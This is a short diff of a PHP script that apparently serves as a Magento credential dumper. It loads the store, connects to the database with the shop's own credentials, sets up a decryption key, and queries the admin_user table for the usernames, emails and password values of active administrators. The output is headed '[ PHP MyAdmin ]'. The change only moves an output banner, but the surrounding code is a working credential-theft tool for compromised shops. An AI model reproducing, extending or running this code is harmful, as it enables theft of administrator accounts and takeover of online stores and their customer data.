@@ -31,7 +31,7 @@
 			   $app = Mage::app('default');
 			   Mage::getSingleton('core/session', array('name'=>'frontend'));
 		   }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";}
-
+		echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
 		   if (!mysql_connect($connection->host, $connection->username, $connection->password)){
 			   print("Could not connect: " . mysql_error());
 		   }
@@ -42,7 +42,6 @@
 		$crypto->init($key);
 
 		//=========================================================================================================
-		echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
 		$query = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");
 		if (!$query){
 			  echo "<center><b>Gagal</b></center>";
